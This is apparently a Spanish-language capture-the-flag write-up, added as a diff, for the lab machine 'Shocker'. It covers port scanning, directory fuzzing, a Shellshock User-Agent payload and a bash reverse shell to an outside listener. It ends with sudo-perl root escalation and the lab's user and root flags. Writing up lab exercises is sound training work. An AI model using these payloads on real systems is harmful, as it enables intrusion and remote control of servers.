@@ -1,0 +1,93 @@
+1. Enumeracion de puertos
+
+Todo rango de puertos tcp
+	❯ sudo nmap -p- -sS --min-rate 5000 --open  -vvv -n -Pn 10.10.10.56 -oG allPorts
+
+❯ sudo nmap -sC -sV -p80,2222 10.10.10.56 -oN targeted
+
+veo que hay un servidor apache corriendo y lo compruebo en el navegador
+
+http://10.10.10.56/
+
+dont bug me
+
+wfuzz
+
+rutas que se van a sustituir en ña web y si no dan código de error 4040 entonces es que existen
+
+❯ sudo wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
+
+hay otros como gobuster, feroxbuster
+
+existen los directorios icons, cgi-bin
+
+buscar recursos en cgi-bin
+
+shell shock atack, extensionesme creo un archivo con estensiones /content/extensiones.txt
+
+
+sudo wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensiones.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
+
+en lugar de descargar el archivo de /cgi-biun/user.sh le paso un curl
+
+recurso
+
+https://blog.cloudflare.com/inside-shellshock/
+
+❯ sudo curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /usr/bin/whoami"
+
+se consigue ejecutar whoami en el servidos "shelly"
+
+se puede hacer con burpsuite interceptando la peticion http y cambiando el user agent
+
+ya estamos dentro de la maquina
+
+montamos una reverse shell 
+❯ sudo curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1"
+
+❯ nc -nlvp 443
+
+tratamiento de la tty
+
+nos lanzamos una pseudoconsola
+
+shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash
+^Z
+stty raw -echo; fg
+reset
+xterm
+
+
+shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm
+shelly@Shocker:/usr/lib/cgi-bin$ export SHELL=bash
+shelly@Shocker:/usr/lib/cgi-bin$ nano
+shelly@Shocker:/usr/lib/cgi-bin$ ^C
+shelly@Shocker:/usr/lib/cgi-bin$ stty rows 53 columns 86
+shelly@Shocker:/usr/lib/cgi-bin$ nano
+
+cd /home/shelly
+
+user.txt
+46fa93e5f642fa14383a81b3d2ad7670
+
+
+id
+searchexploit lxd
+
+sudo -l
+
+se tienen permisos de administrador para perl
+
+con perl se puede obtener una shell
+
+https://gtfobins.github.io/gtfobins/perl/#shell
+
+shelly@Shocker:/home/shelly$ sudo -u root perl -e 'exec "/bin/sh"'
+whoami
+
+cd /root
+
+cat root.txt
+78ea93d659c7d13c535b5af4dcfd478f
+
+
